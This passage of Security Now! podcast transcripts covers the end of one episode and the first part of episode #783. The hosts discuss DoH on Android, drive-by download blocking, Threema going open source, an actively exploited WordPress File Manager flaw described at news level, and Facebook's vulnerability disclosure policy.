LEO:  Right, right, yeah.  So that's, you know, we bounce it through I think two redirects right now.  One is our own for counting because we charge people based on how many people listen, so we need to count that.  It's a cost per thousand is how we work.  And then we do this additional Chartable redirect so that people can - I think it's Chartable.  I hope I'm not saying the wrong name.  We went through three different companies to find one that really was privacy forward and would do this respectably.  And we think we've found one, and I can't remember who it was.  But gosh, I'm probably saying the wrong name.  Anyway, this company matches it up without giving up any information of yours to anybody else.  And I think that's benign; right?



STEVE:  Yeah.



LEO:  Does it sound like...



STEVE:  I think that's as benign as it could be.



LEO:  Yeah.  The beauty of RSS, the reason Spotify's buying podcasts is because then you listen in their app.  That's why they make them exclusive.  And they know everything about you.  We don't know anything about you.  We just know you downloaded the show.  And all we know is the IP address you used when you downloaded it.  That's it.  And frankly, that's all we'd ever want to know.  And I don't want to know that much, but it's inevitable.  That's how you count.  You have to count unique IP addresses or you wouldn't know the downloads; right?  Because very frequently, for instance, you use Apple's podcast client, it'll open 10, it'll open 10 different parts of the podcast at once.  So is that 10 downloads?  No, that's one.  And so you can't just count hits.  So anyway, I'm sorry.  I didn't meant to - in full disclosure we do something like that.  



STEVE:  Yeah.



LEO:  But I think we do it in a way that's as benign as possible.  Anyway, if you hate that, then use VPN, ExpressVPN.  No one will know.  No one will know.  It's completely up to you.



Steve, once again you have illuminated and explicated and pontificated.  You've done all the -ateds.  And that means we're done.  You can go to GRC.com, where he does not track you.  Do you even keep logs, web logs?  Probably not; right?



STEVE:  I don't have logs.  I don't have logging on, no.



LEO:  People think that their IP address is a super secret thing.  It's every website you go to gets it.  Obviously, they couldn't open a conversation.  And most web server software by default logs.  You would have to explicitly go to IIS and say, I don't want to know.  Don't keep track.  It's just filling up my hard drive with useless information.



So go there.  It's safe.  GRC.com.  You'll find lots of stuff there including SpinRite, the world's best hard drive maintenance and recovery utility.  If you buy 6.0 now, 6.1's coming soon, and you'll be there.  Free upgrade.  He also does a lot of great free stuff, including all this vitamin stuff is there, the health stuff, if you want to see that.  And the podcast, 16Kb and 64Kb audio.  Plus, and it's unique to Steve's site, transcripts, really nicely done by a human transcriber, Elaine Farris, who does a great job with these.  You'll get that, and she's doing it right now.  Stop typing.  Elaine, stop typing.



STEVE:  She also corrects my mistakes, which is really handy.  I get the years wrong sometimes.



LEO:  Oh, that's handy.  And does she leave out the ums and uhs?  Probably not.



STEVE:  I don't remember.  We discussed that a long time ago.  I hope so.



LEO:  You see some of those in there every once in a while.  That's fine.  Hey, we want a record of the show.



STEVE:  It humanizes it.



LEO:  It's also really great for search because you can do a text search on it and find that part of the show very easily.  A lot of people like to read along while they listen.  That's all at GRC.com.  We have 64Kb and video at our site, TWiT.tv/sn.  You can also subscribe in your favorite podcast at a client.  You can use Spotify if you want, but it's an RSS feed, so they don't - you can use anything you want, anything that'll take RSS feeds, and you'll automatically get it the minute it's available.  Subscription's the best because then you don't miss  a single episode.



If you want to watch us do it live, it's Tuesdays, 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  The live audio and video streams are at TWiT.tv/live.  Those go all day and all night.  So you can always hear what's going on in the studio.  About an hour from now it'll be All About Android coming up.  TWiT.tv/live.  Chatroom, if you're watching or listening live, is irc.twit.tv.  They're doing the same.



Offline we have a forum, just like Steve does.  That's our TWiT Community at www.twit.community.  So that's for people who are listening asynchronously.



Steve, have a wonderful week, and I'll see you next time.



STEVE:  Thank you, my friend.  Right-o.  Bye.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#783

DATE:		September 8, 2020

TITLE:		IoT Isolation Strategies

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-783.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at another device to receive DoH privacy, a browser to block drive-by downloads, my favorite messaging solution going open source, a new and trivial attack against hundreds of thousands of WordPress sites, Facebook's new vulnerability disclosure policy and their publication of WhatsApp security advisories, forthcoming security researcher policies for U.S. government properties, a new Tor Project membership program, Intel's latest microcode patches, the result of a small but significant double-blind controlled trial related to COVID outcomes, a SpinRite update, and a discussion of the need and means of enforcing strict IoT network isolation.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  For a long time he's talked about the three-router solution to isolating IoT devices.  Well, for the first time ever, Steve has finally got some IoT devices.  He's been spending some time thinking about it, and he's got several really useful and fairly easy techniques for protecting yourself against those little servers all over your house.  Stay tuned.  Security Now! is next.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 783, recorded Tuesday, September 8th, 2020:  IoT Isolation Strategies.



It's time for Security Now!, the show where we cover your security and privacy and all that jazz online from the red sun headquarters up here in blighted Petaluma.  I'm saying hello to Steve Gibson.  It's a little clearer down there, I know.



STEVE GIBSON:  Little clearer.  It's been hot and, boy, was it humid.  Or I guess it is today, actually.  I've not been outside.



LEO:  Muggy?  Yeah.	



STEVE:  Yeah.



LEO:  We have a lot of smoke still from fires.  I know you have fires down where you are, too.



STEVE:  Yeah.



LEO:  Hope you stay safe.



STEVE:  California's been crazy.



LEO:  It's been bad, yeah.



STEVE:  And actually it's the heat and the humidity that is actually responsible, oddly, for the topic this week.



LEO:  Oh, really.



STEVE:  Because, yes, I have bit the bullet finally and stepped into the IoT world.



LEO:  What?



STEVE:  Because I wanted some of the functionality that IoT provides.  And of course in order to do that safely you can't just stick these things on your network.  And so I thought it would be useful to revisit IoT isolation strategies, which is our topic for the week, because I just implemented two different ones for my two locations.



LEO:  Oh, good, yeah.  Because people ask me about your three-router solution all the time.  That has become legend.



STEVE:  Right.  Well, it ends up being a good solution, even only if you use two routers, which we're going to talk about.  But we had a bunch of stuff going on.  We're going to take a look at another device to receive DoH privacy protections, a browser to block drive-by downloads, or I should say another browser which will begin blocking drive-by downloads.  And we're going to sort of remind ourselves what those are and what that's about.  And of course I heard you already talking about my favorite messaging solution.  I think they were listening to you, Leo, or somebody's ears were burning.  I'm not sure how that works.  Because my favorite messaging solution has announced that it will be going open source.



LEO:  Yeah, this is huge, huge.  Yeah, yeah.



STEVE:  And of course you know what that is.  Yeah, huge.  We've got a new and distressingly trivial attack against hundreds of thousands of WordPress sites.



LEO:  Oh, boy.



STEVE:  And we just seem to be talking about this now all the time.  Once upon a time it was Flash exploits.  Now it's WordPress.  Also Facebook has a formal vulnerability disclosure policy.  And also they're going to be publishing WhatsApp security advisories.  And there's some interesting back story for both of those.  We've got forthcoming security researcher policies for U.S. government properties which is really welcome because everyone's a little twitchy about, well, if I find a vulnerability on a government site, I don't want to get sued for poking at it or talking about it or even informing them.



We also have a new Tor Project membership program.  Intel's latest microcode patches and a couple takes on that.  Also in one piece of miscellany the result of a small, but surprisingly significant, that is, a P of less than 0.001, double-blind controlled trial which was related to COVID outcomes.  A quick SpinRite update, and then we're going to dig into the need to isolate your IoT devices and my thoughts about how to do that.  So I think a great podcast for our listeners.



LEO:  Some meaty material to sink our teeth into.  And I'm looking forward to hearing about IoT solutions because I know that's a big one.  Steve?



STEVE:  So our Picture of the Week is just something, it's kind of something I've always been bemused by and just sort of sad about, which is what has happened to our URLs.  I love this because this was something someone tweeted to me, email that he received at his Gmail account.  And it reads:  "We have reset your EA account password.  We know this is an inconvenience and hope you recognize that we take the safety of your personal information seriously.  What happened?  After detecting potentially suspicious activity associated with your EA account, we reset the password to protect your personal information.  At this time we do not think the suspicious activity is the result of unauthorized access to EA databases.  We think the activity  may be related to issues like phishing, weak user passwords, logging in from shared components," blah blah blah.



Anyway, "What do I need to do?" it asks the user.  And it says:  "Use this URL to change your password."  Now, in this email the URL, I mean, it didn't even begin to fit on one line.  It's one, two, three, four, five, six, seven, it's eight lines long of just random wrapping gibberish.  And, okay, so yeah, you could click on it, and clearly that uniquely identifies the recipient of the email to signin.ea.com.



But what I loved was down at the bottom, and this is - we've talked about this before - good security advice.  It says:  "Tip:  We suggest manually typing the URL into a browser to ensure that you open a secure page.  Secure page URLs use the https prefix."  And of course good luck typing this URL into your browser.  You'd way be better off just starting over with EA.  Anyway, I just got a kick out of that.  It's like this maybe once upon a time they were using URLs that you had some snowflake's chance in hell of manually entering into your browser.  But those days are long gone.  This thing is a nightmare.  So just click it and hope for the best because you're not going to be able to type it in.



DoH is coming to Chrome for Android.  Although the desktop releases of Chrome have offered the enhanced security and privacy that many of us love, offered by DNS-over-HTTPS, which appeared in Chrome 83, two major versions ago.  It wasn't added to the iOS or Android editions back then.  But last Wednesday's Chromium blog was titled "A Safer and More Private Browsing Experience on Android with Secure DNS."  And I think I would argue that that's a good place to have DNS-over-HTTPS.



Paraphrasing from Google's posting for the sake of brevity, and to skip a bunch of stuff that we all already know, they said:  With Chrome 85, we're extending support of Secure DNS in Chrome to Android.  As we did for the launch of DoH on Chrome for desktop platforms, we'll progressively roll out DoH on Chrome for Android to ensure the feature's stability and performance, as well as - and I think this was significant, too - help DoH providers scale their services accordingly.



You know, we've talked about the fact that arguably setting up persistent HTTPS connections to DNS servers is a significantly more burdensome process for the server than just fielding UDP packets.  DNS, traditionally over UDP, is in comes a packet and out goes a reply.  HTTPS involves the whole TLS handshake to set it up.  And then you're maintaining a persistent session.  You don't want to have to do that every time you make a DNS query or it'll be way slower, and nobody wants a performance hit when you get authentication and privacy.  But still, you have to maintain state over at the server end in order to offer this service.  And that can require the providers to scale in order to make that happen.  So presumably they're going to be keeping an eye on how well this does.  And in fact they talk about that a little bit, about the possible need to fall back.



They said:  "Android Chrome will automatically switch to DNS-over-HTTPS if your current DNS provider is known to support it." And I just hit the spacebar by mistake and scrolled.  "This also applies to your current Android Private DNS [DNS-over-TLS] if you have configured one."  They said:  "This approach means that we can preserve any extra services provided by your configured DNS service provider, such as family-safe filtering, and therefore avoid breaking the user's expectations," you know, making it transparent.



They said:  "In this automatic mode, Chrome will also fall back to the regular DNS service of the user's current provider, for example, if you had configured DNS-over-TLS, in order to avoid any disruption, while periodically retrying to secure DNS communication."  So presumably, as I said, if the provider were to become overloaded or stop offering the services for a while, it'll just smoothly drop back to traditional DNS.



They said:  "In case this default behavior isn't suitable to your needs, Chrome also provides manual configuration options, allowing you to use a specific provider without fallback, as well as the ability to completely disable the feature."  And they said:  "If you're an IT administrator, Chrome will disable Secure DNS if it detects a managed environment via the presence of one or more enterprise policies.  We've also added new DNS-over-HTTPS enterprise policies to allow for a managed configuration of Secure DNS and encourage IT administrators to look into deploying DNS-over-HTTPS for their users."



So anyway, basically it's what we've seen before, offered by other, well, by Chrome and pretty much now all of the browsers who are wanting to move their clients and users from DNS over UDP, traditional DNS, over to HTTPS.  So it's just going to happen seamlessly.  Chrome will start supporting it.  If they see that you're using - and it comes with like a list of known providers.  If they see that you've already switched your DNS there, then they will just upgrade you to that provider, if that provider is known to offer the service.  And because it'll be an automatic upgrade, if there's a problem they'll back you out of it.  And then in addition, once that's provided under Chrome for Android, you can also switch it to sort of a non-automatic mode, provide the IP address and other URL requirements for DNS-over-HTTPS and start using it.



So again, to me I think that makes a lot of sense, especially when a mobile device is out roaming around a lot more.  You're away from home where your DNS is only going, essentially never even going public at all.  It's just to your own local provider in order to get resolution.  So good to see this happening.  And of course we've talked about how this is also being rolled out for Windows that'll be supporting DoH natively for the whole OS.



We're currently today at Firefox 80, eight zero, .0.1.  And that was since last Tuesday, which quickly followed the move to  Firefox 80 when it fixed a couple of regression and other problems.  80 had a problem which was fixed in 80.0.1.  They fixed a performance regression when encountering new intermediate certificate authority certificates.  They fixed crashes possibly related to GPU resets.  They fixed rendering on some sites which were using WebGL.  I think we talked about that last week, actually.  There was actually a security problem with that.  Fixed the zoom-in keyboard shortcut on Japanese language builds.  So, okay, a little obscure there, but that's fixed.  And also download issues related to extensions and cookies.



So we're now at 80.0.1.  It's 82 coming next month that I want to talk about because two editions from now, point releases notwithstanding, Mozilla will finally be catching up with a useful security feature which Chrome has offered since March of last year, 2019.  And that's the feature of blocking so-called "drive-by downloads" from sandboxed iframes.  And really, for any browser these days I would be asking what took them so long.



It does break something that has otherwise been working, so I guess I can understand.  Obviously, there's always a huge reluctance on the part of any browser to change behavior in a way that's more restrictive.  You don't want a browser update to suddenly cause things that used to work to stop working.  And so it's like, hey, before I updated my browser, this was working.  Now it's not.  Of course the browser gets blamed for that, rather than perhaps a site doing something which has now become against best practices.



So we talked about this recently, that is, the idea of so-called "drive-by downloads."  It's possible for JavaScript running on a page to all by itself, autonomously, initiate a download of a file by that browser.  And you often see that in some of those a little more sketchy download repository sites where you go, you click on a download because you want something that you haven't been able to find anywhere else.  And it says, "Your download should start in 12 seconds," or some length of time.  And then it sits there counting down.  And it's like, okay, what am I waiting for?  Why didn't it just start now?  Well, it's because they've got advertisements all over the page.  And they're hoping that, if they just hold you there, if they just stall the download that you want, maybe you'll see something that interests you, or who knows.  Maybe the advertisement knows how long it's got your eyeballs, and they're actually getting paid more if the ad stays visible longer.  That's certainly possible, and that's been done in the past.



In any event, the point is this is script which is deliberately not triggering the download in your browser until it decides to.  Then it does.  So that's all being scripted.  And of course you'll also notice that sometimes it'll say, "If your download does not start in [some length of time], click here," which is the non-scripted, normal, click to start the browser URL in order to manually trigger the download.  So the point is script is able to do this.  And when I talked about it before, I mentioned that, oh, the place I see it is on SourceForge.  Often there's something that I'm wanting to get from SourceForge, and for whatever reason they do the same thing.  You click on the download link which actually takes you to a different page where it says, oh, your download will start in X amount of time.  And it's like, okay, fine.



When that finally happens, what I was noticing was that, in Chrome, I would wait to see something happen, not noticing that it had opened a little download tab thing, a little box down in the lower left of the browser window.  So unless you're looking for it, it just sort of appears down there.  That's if you're still using Chrome's default, which is not to ask you for the download location every time.  And this is what we were talking about before is, because I realized I could change this, I did.  I went in, I changed the default to prompt for where it wants to go, and now I get a big pop-up browsable dialog that allows me to specify where I want the download to go.  So it's no longer transparent and invisible.



And of course bad guys can use this.  And this is the point of the whole drive-by downloads.  Bad guys can use this behavior on web pages to quietly cause your browser to download something that you may not notice.  And so some time later you look down, and you go, oh, there's something that was downloaded.  And it's also, of course, on your computer.  So perhaps at some later date you look in your downloads folder, and you see something that you don't remember getting, don't know what it is, and so you click on it because it's there, and you think, well, I must have downloaded it on purpose by mistake previously, but no.  Malware did this.



So the good news is that's going to be changing.  We've established that a website's JavaScript is able to trigger a download which might go unnoticed by a user, who might later then make the mistake of clicking it.  It could be malware, and then they're in trouble.  So that functionality for so-called "sandboxed iframes" started being disabled by Chrome a year ago last March, March of 2019.  It could be reenabled with a flag, if that caused a problem.  They were kind of hedging their bets.  But then that got removed, I think it was in May of this month that they finally took that away.



So this happens with so-called "sandboxed iframes."  A sandboxed iframe is one that includes the tag "sandboxed."  And what sandboxing in iframe does is immediately restrict what any content in the iframe is able to do.  It's a good thing to do.  And we talked about this some years ago, the idea of just adding a "sandbox" tag to all of the iframes that you have any control over.  Or at the time, ask your webmaster to do that.  The point being that very often iframes are typically providing content from offsite servers, in other words, often advertising servers, and you don't want the content that gets loaded by the iframe to have the total run of your web page.  You don't want it to be able to do anything that the hosting page is able to do.  It needs to be restricted.  Sandboxing does that.



One of the things that was still allowed in a sandboxed iframe was, if scripting was allowed - which almost always has to be allowed for advertising scripting.  So for example, if you're a site that wants advertising, you set aside some space in an iframe where you then reference an advertising server.  Part of their terms are going to be, well, we need to run script in our iframe in order to do ad rotation and to monitor ad hits and clicks and eyeballs and so forth.  Until recently, that script was able to do a drive-by download.  Chrome backed it off.  Now, in October, next month, Firefox will also do so.  If for some reason you need an iframe to be able to do so-called "drive-by downloads," or to allow scripting to trigger a download for some reason, you are able to override that in the iframe by adding an "allow download" tag to the "sandbox" tag.  So you're able to still back that behavior out.  But by default that will be shut down.



And so once again, as ever, we are inching forward bit by bit, gradually undoing what was now seen as or is seen now as too permissive security mistakes that we collectively made as an industry back when we were all still amazed that all of this stuff worked at all.  Now we know it works, and we're wishing that it was a lot more secure than the way it was originally created.  Of course it's always difficult to take away functionality because that risks breaking things.  So we're just doing it bit by bit, carefully.



So the news that I'm excited about - and Leo, I know you are excited about it - it was by far the most tweeted bit of news I was receiving last week is the news that Threema has decided to go open source, and also to welcome a new partner.  They announced it, I think it was last Thursday.  They announced in a blog posting that they were going to be teaming up with an investment company, a German-Swiss investor, I guess it's Afinum, A-F-I-N-U-M, Afinum Management AG.  And it looks to me, since the original Threema founders are staying in place and are retaining, they made a point of saying, a significant ownership interest, what I think must have happened is they had managed to build Threema up to the point where it was valuable enough that they could peel off some equity in order to raise money for themselves, in order to do things that they want to do moving forward.  And one of the things they had wanted to do, which they now feel they can, is to take Threema open source.



And of course we talked about Threema just recently because they had just added, it was in the context of them adding video calling.  And in order for it to be done as well as they wanted to do it, that is to say, as truly privately as they wanted to do it, they had to modify the WebRTC standard, which was not protecting some of the metadata, signaling information that was used to set up the WebRTC call.  They modified the WebRTC standard.  They're going to be working to have that standard essentially backported into WebRTC, and then they were able to add it to Threema.  So all of our listeners know that I love Threema because their system is the easiest, well, I'm sorry, their system is the most secure because you could argue that it's the least easy to use.  On the other hand, it's not that difficult.  You were just demonstrating it on iOS Today, I think. 



LEO:  Yeah.  And I've shown my QR code and everything.



STEVE:  Yeah.



LEO:  It does, it is kind of - prefers in-person meetings.  The reason I like Threema better is, unlike Signal, it doesn't require you to give a phone number or any personal identifying information.  So it really is private.  Which Signal isn't, unfortunately.



STEVE:  Correct, yeah.  Well, and I say it's the least easy to use because that doesn't mean it's difficult.  But it just means that its key management is not 100% transparent and automatic.  And so my point is, as I made it before, if you actually do care about security, then managing your most important secret...



LEO:  You want that to be hard.



STEVE:  ...which is your keys - yeah, exactly.



LEO:  You want that to be sophisticated.  But you saw how easy, if you watched iOS today, how easily Mikah shared his QR code with me, and I shared mine with his, and now we have three dots, each of us, because we verified in person, in effect.  And people were saying, well, why are you showing your QR code on the air, Leo?  Well, if you presume that you're seeing me, and this is really me, with that QR code...



STEVE:  I'm sure it's you, Leo.



LEO:  You don't need to do it in person.  It's just that in a way that you're comfortable that that is me, and it hasn't been hijacked, the QR code hasn't been somehow replaced in transmission to you.



STEVE:  Correct.



LEO:  And I think that's a fairly safe bet.



STEVE:  And we know what it is that you're showing is not a secret.  It is your public key.



LEO:  That's my public key; right.



STEVE:  So, yes.  So by definition it can be public.  It's just like a PGP public key.



LEO:  Right.



STEVE:  And in this case it's a way of visually exchanging it between people.  You're exchanging your public key.  So what that means is several things.  It means that anything they create and encrypt with your public key can only be decrypted by your private key.  So they know that nobody but you can read it.  And similarly, they have also encrypted it with their private key.  And so when you receive something from them, which you decrypt first with your private key and then with their public key, you also know it absolutely came from them.  So it prevents spoofability.



So, I mean, it is the way to do truly secure TNO, Trust No One, messaging.  And it's a point I've always been making about iMessage is, yeah, I'm sure it's encrypted.  I mean, I'm sure it's end-to-end encrypted.  But from a purely anal retentive security standpoint, if I'm not myself managing keys, then somebody else is.  I've delegated key management.  Which is, I'm not saying it's bad.  It just means you trust Apple.  And I know we do trust Apple.  But you've delegated your key management to a third party, which now it's not TNO, it's Trust Only Apple, TOA.  And that's probably fine.



LEO:  And I always averred that if it's not open source, it's not TNO because you don't know what's going on in the binary blob.  But once it's open source - and actually I think Threema had this interim thing we talked about last week where they had a provable that you would encrypt a file and run it against open source and prove that they were using that bit of it was open source.  But this is [crosstalk].



STEVE:  And it was being periodically audited by outside entities, so they had that.  What they said is, they said:  "Security and privacy protection are deeply ingrained in Threema's DNA, which is why our code gets reviewed externally on a regular basis.  Within the next months, the Threema apps will become fully open source, supporting reproducible builds."



LEO:  That's key also.



STEVE:  "This is to say" - yup - "that anyone will be able to independently review Threema's security and verify that the published source code corresponds to the downloaded app."  And it's going to be on GitHub.



LEO:  I think that's [crosstalk].



STEVE:  And they also said:  "In the future it will be possible to use multiple devices in parallel, thanks to an innovative multi-device solution."



LEO:  That's one problem is you can't use it on your phone and your iPad.  You can use one or the other.



STEVE:  Exactly.  They said:  "In contrast to other approaches, no trace of personal data will be left behind on a server.  Thanks to this technology, Threema can be used on a PC without a smartphone."



LEO:  That's awesome.  So right now you run the website, show it the special QR code from your Threema app on your phone, and you can do it on the desktop.  But it's a temporary.  You have to keep pairing it and things like that.  And I have to say that I've made Threema now my default instead of Signal for that simple reason.  I think this is - now that they're open source, I agree with you.  I mean, I trust Moxie Marlinspike, et cetera, et cetera.  And by the way, the other thing that Threema allows you to do is share your contact list so that you can see if anybody else you know is on Threema.  I would not do that, and it is not required.



STEVE:  Right, right.



LEO:  So please don't share my information with anybody else.  Let them find me [crosstalk].



STEVE:  Well, Leo, and in this day and age of Zoom conference calling and the ability to, for example, use iMessage to exchange the Threema QR code, you can put it on a screen, snap a picture of it, send it to somebody.  So, I mean, you can create this secure sharing easy enough in order to know that you've swapped public keys.



LEO:  Yeah.  I put my ID on my website.  Mostly because if somebody wanted to communicate with me privately, I've really come to the opinion that, even though I use PGP, and I love it, it's not inherently secure.  It's too hard for most people to set up.  Secure messaging is certainly the preferred way, if you want to have a secure conversation.



STEVE:  Well, it's like - I just love the original comment.  What's the best camera?  The answer is, well, the one in your pocket.



LEO:  Yeah, right, right.



STEVE:  Or the one you have with you when something happens that you want to take a picture of.



LEO:  Right.



STEVE:  Similarly, what's the best encryption?  It's like, well, there may be really good encryption which is really difficult to use.  So how about really good encryption that's simple to use?



LEO:  That you've got, that works, yeah.



STEVE:  Exactly.  So WordPress once again.  It's not good when a zero-day flaw is discovered being actively exploited in an extremely popular plugin for WordPress.  And it's also somewhat jarring that we keep covering exactly this news.  In the latest of a continuing series of such WordPress vulnerabilities, the so-called "WordPress File Manager" plugin is currently being, and I say "currently" because there are still hundreds of thousands of vulnerable WordPress installations, actively exploited to permit full website hijacking.  That'll ruin the day of anybody who has a big investment in their WordPress site.



The Sucuri WordPress security team said that the vulnerability was introduced into the May 5th v6.4 of WordPress File Manager.  However, other reporting suggests it's been there since 6.0, so substantially longer than May 5th.  It may have only been seen for the first time there.  And so File Manager, this WordPress File Manager, is used as an alternative to FTP for managing file transfers, copying, deleting, and uploading files.  And when I said "popular," I wasn't kidding.  It's used by more than 700,000 active WordPress installations.



The mistake that was made, everybody's going to be able to understand.  It was minor.  Well, okay, dumb, but had major consequences.  One of the plugin's files was renamed by the development team while they were developing it for testing purposes from its safe inactive form to its dangerous active form.  And the project with that renamed file was then distributed.  The file was "connector-minimal.php-dist," but it was mistakenly left renamed to "connector-minimal.php."



So as anyone who's done any web work knows, a file ending in .php-dist would not invoke the PHP interpreter to parse and process its PHP script.  If the web server happened to have a MIME type associated with that file extension, that is, php-dist, you know, it might download it to you, if you were to query for it.  But it would not execute it as a script.  But any remotely accessible file ending in .php would be executed because the web server would invoke the system's registered PHP interpreter.  So the only thing that any attacker needed was to invoke that script remotely and have at it.  Which is exactly what then started to happen.  What that errant file permitted was bad, or as the Sucuri team said:  "Leaving such a script  intentionally designed to not check access permissions  in a public build causes [what they described as] a 'catastrophic vulnerability' if this file is left as-is in the deployment."  And that's what happened.



They said: "This change allowed any unauthenticated user to directly access this file and execute arbitrary commands to the library, including uploading and modifying files, ultimately leaving the website vulnerable to a complete takeover."  And that's 700,000.  Wait, no, I'm sorry, it was 53% of the 700,000 WordPress sites using this File Manager were vulnerable.  So more than 350,000 WordPress sites at the time of its discovery.  The solution, which appeared in the replacement v6.9 distribution, was simple.  They simply deleted the file and any other unused .php-dist files.



However, a week before the file was removed, a simple proof of concept was posted on GitHub, which led to a rapidly mounting wave of attacks against websites until those sites were updated to v6.9.  Sucuri says the exploit rapidly gained traction.  The first attack was spotted last Monday, August 31st, the day before a fixed version of the File Manager was released.  This ramped up to 1,500 attacks per hour, and a day later this had increased to an average of 2,500 attacks per hour across the global Internet of WordPress sites.  And by the next day, September 2nd, that is, when we were doing this podcast last week, Sucuri was clocking around 10,000 attacks per hour.  Sucuri said that they had tracked hundreds of thousands of requests from malicious actors attempting to exploit this trivial-to-exploit vulnerability.



Later analysis showed that the flaw was in, as I mentioned before, File Manager from v6.0 to 6.8.  Statistics from WordPress show that currently 52% of installations are vulnerable, so a little over half of the 700,000 known to be vulnerable.  And as of last Thursday, the next day, September 3rd, only 6.8% of those 52% of the total 700,000 originally vulnerable WordPress websites had updated.  So again, the fact that a patch is made available doesn't mean that everybody instantly has it.  So this has just been a catastrophe.



And as I mentioned before, the last thing you want is to have a PHP-based system accessible to the rest of your Internet.  We're going to be talking at the end of the podcast about sequestering an IoT network from the rest of your network.  I've talked about before, and I'll just say again in this context, you should also sequester a server where you've got PHP social media stuff, whether it's an online forum or it's a WordPress site where you added plugins and such, which are hard to avoid adding because they do create additional value.  Similarly, that server should be sequestered from the rest of your corporate or personal or local network because this kind of thing can happen just too easily.  Maybe only the website would be defaced.  But if you're a known enterprise with a WordPress-based presence, bad guys might not stop at just defacing WordPress.  They could use this as the beachhead through which to launch an attack to move laterally in your network.  So the idea of creating lots of compartmentalized websites really does make sense.



So Facebook published a new, for them, Vulnerability Disclosure Policy.  The many Facebook platforms run on a bunch of code, and much of the code is theirs.  But as is increasingly the case as the industry matures, code pulled from many third-party libraries is also often used.  So the question becomes what should Facebook do when it finds a problem in some third party's code?  This is sort of like a Facebook commercial version of Google's Project Zero, where although in their case they're not deliberately going out and trying to find problems, they're needing to make sure that their amalgamated result functions, and they're needing to use third-party libraries.



So they formalized and published their policy, which is I think well thought out and reasonable.  It's similar to Google's Project Zero, with some inevitable differences.  In explaining this, they explained what they were doing.  They said:  "Facebook may occasionally find critical security bugs and vulnerability in third-party code and systems, including open source software.  When that happens, our priority is to see these issues promptly fixed, while making sure that people impacted are informed so that they can protect themselves by deploying a patch or updating their systems.  That sounds simple and clear cut.  However, vulnerability disclosure is anything but simple.  Here is what motivated our policy."



They said:  "First, not all bugs are equally sensitive.  A high-impact security issue requires much more care before it is publicly disclosed.  The policy outlined below explains how we handle vulnerability disclosure.  And, two, fixing an issue requires close collaboration between researchers at Facebook reporting the issue and the third party responsible for fixing it.  With this policy, we want to clearly and unambiguously explain our expectations when we report issues we find in third-party code and systems.  We also make sure when Facebook will disclose these issues."



So for their policy they said:  "In a nutshell, Facebook will contact the appropriate responsible party and inform them as quickly as reasonably possible with a security vulnerability we've found.  We expect the third party to respond within 21 days to let us know how the issue is being mitigated to protect the impacted people.  If we don't hear back within 21 days after reporting, Facebook reserves the right to disclose the vulnerability.  If within 90 days after reporting there is no fix or update indicating the issue is being addressed in a reasonable manner, Facebook will disclose the vulnerability."  Okay.  So three weeks to hear something saying okay, we've established communications, we're on it; and three months for, very much like Google's Project Zero, a drop dead for this is going to be, you know, Facebook's going to disclose.



So they said:  "That said, we will adhere to the vulnerability disclosure steps and the proposed timelines whenever reasonably possible, but we can envision scenarios where there might be deviations.  If Facebook determines that disclosing a security vulnerability in third-party code or systems sooner serves to benefit the public or the potentially impacted people, we reserve the right to do so."  And they said:  "Here are some details."



For reporting they said:  "Facebook will make a reasonable effort to find the right contact for reporting a vulnerability, such as an open source project maintainer.  We will take reasonable steps to find the right way to get in touch with them securely.  For example, we'll use contact methods including, but not limited to, emailing security reporting emails like security@ or secure@, filing bugs without confidential details in bug trackers, or filing support tickets.  The contact should acknowledge the report as soon as reasonably possible.  The contact should confirm whether we've provided sufficient information to understand the reported problem.



"In its report, Facebook will include a description of the issue found, a statement of Facebook's vulnerability disclosure policy, and the expected next steps.  If needed, Facebook will provide additional information to the contact to aid in reproducing the issue.  If we do not receive a response within 21 days from a contact acknowledging the report of a vulnerability, we will assume that no action will be taken.  We then reserve the right to disclose the issue.  For purposes of the disclosure timeframe, Facebook's sending the report constitutes the start of the process.  Facebook will generally decline to sign non-disclosure agreements specific to an individual security issue that we have reported."



Under mitigation and timeline they said:  "Whenever appropriate, Facebook will work with the responsible contact to establish the nature of the issue and potential fixes.  We will share relevant technical details to help expedite the fix.  The contact should be as transparent as possible about the mitigation progress.  They are expected to make reasonable effort to fix the reported issue within 90 days.  Facebook will coordinate the disclosure with the availability or rollout of the fix.  If no fix is forthcoming at the 90-day mark, we will notify the contact of our intent to disclose the reported issue.  If there are no mitigating circumstances, we will disclose the issue as soon as we are reasonably able to do so."



And finally, under disclosure:  "Depending on the nature of the problem, there may be a number of disclosure paths.  One, we may disclose the vulnerability publicly; two, we may disclose it directly to the people using the project; or, three, we may issue a limited disclosure first, followed by a full public disclosure.  Facebook will work with the contact to determine which approach is most appropriate in each case."  They said:  "Our intent is to disclose vulnerabilities in a way that is most helpful to the community.  For example, we may include guidance on workarounds, methods for validating patches are in place, and other material that helps people contain or remediate the issue.  We may choose to include a timeline to document communication and remediation actions taken by both Facebook and the third party.  Where reasonable, our disclosure will include suggested steps for mitigating actions.  We will include a CVE when available and, if necessary, issue an appropriate CVE."



And then they said, under additional disclosure considerations, they said:  "Here are some potential scenarios when Facebook may deviate from our 90-day requirement:  if the bug is actively being exploited, and disclosing would help people protect themselves more than not disclosing the issue.  If a fix is ready and has been validated, but the project owner unnecessarily delays rolling out the fix," they said, "we might initiate the disclosure prior to the 90-day deadline when the delay might adversely impact the public.  And finally, if a project's release cycle dictates a longer window, we might agree to delay disclosure beyond the initial 90-day window where reasonable."



They said:  "Facebook will evaluate each issue on a case-by-case basis based on our interpretation of the risk to people.  We will strive to be as consistent as possible in our application of this policy.  Nothing in this policy is intended to supersede other agreements that may be in place between Facebook and the third party, such as our Facebook Platform policies or contractual obligations."  And they said:  "Finally, this policy refers to what Facebook does when we find an issue in third-party code.  If you believe you have found a security vulnerability on Facebook or other member of the Facebook family of apps, we encourage you to report it to our Bug Bounty Program."



